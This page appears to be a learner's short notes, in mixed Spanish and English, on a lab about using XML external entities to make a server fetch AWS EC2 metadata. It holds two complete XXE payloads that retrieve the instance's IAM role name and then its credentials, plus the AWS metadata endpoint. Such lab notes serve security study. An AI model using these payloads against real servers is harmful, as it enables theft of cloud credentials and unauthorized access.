---
layout: default
title: 2 - Exploiting XXE to perform SSRF attacks
---
Para acceder al server's IAM secret access key from the EC2 metadata : 

```
http://169.254.169.254/latest/meta-data/iam/security-credentials
```

Ver el nombre del rol asignado **IAM Role (rol de AWS IAM)** que está **vinculado a una instancia EC2**. Este rol define **qué permisos tiene esa instancia** para interactuar con otros servicios de AWS : 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY test SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials">]>
<stockCheck>
	<productId>&test;</productId>
	<storeId>1</storeId>
</stockCheck>
```

```
"Invalid product ID: admin"
```

Obtener las creds del rol : 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY test SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]>
<stockCheck>
	<productId>&test;</productId>
	<storeId>1</storeId>
</stockCheck>
```
